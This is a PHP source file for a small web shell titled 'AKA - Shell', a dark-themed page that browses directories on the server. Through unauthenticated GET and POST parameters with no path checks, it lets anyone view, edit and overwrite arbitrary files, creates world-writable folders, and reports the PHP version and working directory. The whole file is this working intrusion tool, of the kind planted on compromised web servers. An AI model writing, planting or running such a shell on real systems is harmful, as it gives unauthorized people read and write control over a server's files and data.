<?php

$dir = ".";
if(@$_GET['dir']){

    $dir = $_GET['dir'];
}


if(@$_POST['action']){
    if($_POST['action'] == 'setFile'){
        setFile($_POST['path'], $_POST['text']);
    }
}

if(@$_GET['action']){
    if($_GET['action'] == 'newFolder'){
        createFolder($GLOBALS['dir'], 'New Folder');
    }
}

function edit($file){

    $data = file_get_contents($file);
    $new = htmlspecialchars($data, ENT_QUOTES);

    echo '<form action="?dir='.$GLOBALS['dir'].'" method="post">';
    echo '<input type="hidden" name="path" value="'.$file.'">';
    echo '<textarea rows="40" cols="100" name="text">'.$new.'</textarea>';
    echo '<input type="submit" name="action" value="setFile">';
    echo "</form>";
}

function view($file){

    $data = file_get_contents($file);
    $new = htmlspecialchars($data, ENT_QUOTES);

    echo '<textarea rows="40" cols="100" name="text">'.$new.'</textarea>';
}

function setFile($path, $text){
    file_put_contents($path, $text);
}

function createFolder($path, $name){
    
    if(!is_dir($path.'/'.$name)){
        if (!mkdir($path.'/'.$name, 0777, true)) {
            die('Failed to create folders...');
        }
    }else{
        echo "Folder sudah ada<br>";
    }
    
}

function createFile($path, $name){

}

// createFolder($dir, 'tes');
echo getcwd();
print_r(fileperms(getcwd()));
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>AKA - Shell</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <style>
    
    body{
        background-color: #252526;
        color: white;
        padding: 10px;
    }

    .my-table th, .my-table td{
        border: 1px solid white;
        border-collapse: collapse;
        padding: 7px;
    }

    a {
        color: white;
    }

    a:hover{
        color: yellow;
    }

    textarea{
        background-color: #1e1e1e;
    }

    .my-container{
        /* background-color: #333333; */
    }

    </style>

</head>
<body>

    <div class="my-container">

        <h3>My Shell</h3>
        <br>

        <table style="border: 0px solid white">
            <tr>
                <td>PHP version</td>
                <td>:</td>
                <td><?=phpversion()?></td>
            </tr>
            <tr>
                <td>Current Dir</td>
                <td>:</td>
                <td><?=getcwd()?></td>
            </tr>

        </table>
        <hr>
        <form action="">
            <input type="file" name="file">
        </form>
        <br>
        <table style="width:100%" class="my-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Owner/Group</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
            <?php 
            
            $dataDir = scandir($dir);
            uksort($dataDir, 'strcasecmp');
            foreach($dataDir as $entry){
            ?>
                <tr>
                    <td><?=is_dir($dir."/".$entry)?"<a href='?dir=$dir/$entry'>$entry</a><br>":$entry?></td>
                    <td><?=is_dir($dir."/".$entry)?'dir':'file'?></td>
                    <td></td>
                    <td><?=date ("F d Y H:i:s.", filemtime($dir."/".$entry))?></td>
                    <td><?=fileowner($dir."/".$entry)."/".filegroup($dir."/".$entry)?></td>
                    <td><?=fileperms($dir."/".$entry)?></td>
                    <td>
                        <?php if(!is_dir($dir."/".$entry)){?>
                        <a href="?dir=<?=$dir?>&edit=<?=$dir."/".$entry?>" class="glyphicon glyphicon-edit"></a> | 
                        <a href="?dir=<?=$dir?>&view=<?=$dir."/".$entry?>" class="glyphicon glyphicon-search"></a>
                        <?php }else if($entry == '..' || $entry == '.'){ ?>
                        <a href="?dir=<?=$dir?>&action=newFolder" > New Folder</a> | 
                        <?php } ?>
                    </td>
                </tr>
            <?php
            }
            ?>
            </tbody>
        </table>
        <hr>
        <?php
        if(@$_GET['edit']){

            edit($_GET['edit']);
        }
        if(@$_GET['view']){
            view($_GET['view']);
        }
        ?>
    </div>

</body>
</html>